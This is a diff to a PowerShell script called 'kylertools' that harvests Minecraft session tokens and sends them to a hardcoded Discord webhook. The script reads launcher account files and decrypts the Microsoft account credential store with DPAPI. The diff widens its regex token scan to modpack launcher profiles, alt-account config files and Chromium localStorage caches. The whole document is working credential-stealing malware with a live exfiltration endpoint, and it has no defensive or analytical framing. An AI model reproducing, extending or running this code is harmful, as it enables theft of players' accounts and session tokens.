@@ -1,6 +1,8 @@
 $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
 $h = @{ "Content-Type" = "application/json" }
 
+Add-Type -AssemblyName System.Security -EA 0
+
 # test ping
 try{
     $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
@@ -9,18 +11,18 @@ try{
 
 $found = @()
 $seen = @{}
-$jwtRegex = "eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
+$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
 function Add-Token {
     param($tok, $user, $src)
     if(-not $tok){ return }
-    if($tok.Length -lt 20){ return }
+    if($tok.Length -lt 30){ return }
     if($seen.ContainsKey($tok)){ return }
     $seen[$tok] = $true
     $script:found += "user: $user`nssid: $tok`nfile: $src`n"
 }
 
-# 1. old + new account jsons
+# 1. known launcher account files
 $paths = @(
     "$env:APPDATA\.minecraft\launcher_accounts.json",
     "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
@@ -51,40 +53,29 @@ foreach($p in $paths){
             if($j.accounts){
                 $j.accounts.PSObject.Properties | %{
                     $a = $_.Value
-                    $tok = $null
                     $uname = "unknown"
-                    if($a.accessToken){ $tok = $a.accessToken }
                     if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
                     elseif($a.username){ $uname = $a.username }
-                    Add-Token $tok $uname $p
+                    if($a.accessToken){ Add-Token $a.accessToken $uname $p }
                 }
             }
-            # fallback regex scan
             [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
         }catch{}
     }
 }
 
-# 2. decrypt the MSA credential bin (the live one)
+# 2. decrypt MSA credential bin
 $bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
 if(Test-Path $bin){
     try{
         $bytes = [IO.File]::ReadAllBytes($bin)
         $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
         $txt = [Text.Encoding]::UTF8.GetString($dec)
-        $jj = $txt | ConvertFrom-Json -EA 0
-        $tok = $null
-        $uname = "unknown"
-        if($jj.microsoftAccount -and $jj.microsoftAccount.accessToken){ $tok = $jj.microsoftAccount.accessToken }
-        elseif($jj.accessToken){ $tok = $jj.accessToken }
-        if($jj.minecraftProfile -and $jj.minecraftProfile.name){ $uname = $jj.minecraftProfile.name }
-        Add-Token $tok $uname $bin
-        # also regex it
-        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value $uname $bin }
+        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value "unknown" $bin }
     }catch{}
 }
 
-# 3. deep scan launcher folders - account files only
+# 3. deep scan launcher folders for account-ish json
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -100,9 +91,60 @@ foreach($r in $roots){
     if(Test-Path $r){
         try{
             Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","*.auth.json" -EA 0 | %{
+                if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
                 if($_.Length -gt 1mb){ return }
                 $c = Get-Content $_.FullName -Raw -EA 0
                 [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
+            }
+        }catch{}
+    }
+}
+
+# 4. modpack profile configs (opsec + alt account mods)
+$profileRoots = @(
+    "$env:APPDATA\ModrinthApp\profiles",
+    "$env:APPDATA\PrismLauncher\instances",
+    "$env:APPDATA\MultiMC\instances",
+    "$env:APPDATA\.minecraft\config",
+    "$env:APPDATA\.minecraft\versions"
+)
+
+foreach($pr in $profileRoots){
+    if(Test-Path $pr){
+        try{
+            Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
+                if($_.Length -gt 1mb){ return }
+                $c = Get-Content $_.FullName -Raw -EA 0
+                try{
+                    $pj = $c | ConvertFrom-Json -EA 0
+                    if($pj.accounts){
+                        $pj.accounts | %{
+                            $u = if($_.username){ $_.username } else { "unknown" }
+                            if($_.accessToken){ Add-Token $_.accessToken $u $_.FullName }
+                        }
+                    }
+                }catch{}
+                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
+            }
+        }catch{}
+    }
+}
+
+# 5. chromium localstorage in launcher webcaches
+$webcaches = @(
+    "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
+    "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
+    "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
+)
+
+foreach($lc in $webcaches){
+    if(Test-Path $lc){
+        try{
+            Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | %{
+                if($_.Length -gt 5mb){ return }
+                $b = [IO.File]::ReadAllBytes($_.FullName)
+                $s = [Text.Encoding]::UTF8.GetString($b)
+                [regex]::Matches($s, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
             }
         }catch{}
     }
@@ -114,7 +156,6 @@ if($found.Count -eq 0){
 
 $joined = $found -join "`n"
 
-# chunk to fit webhook limit
 $limit = 1800
 $chunks = @()
 for($i = 0; $i -lt $joined.Length; $i += $limit){
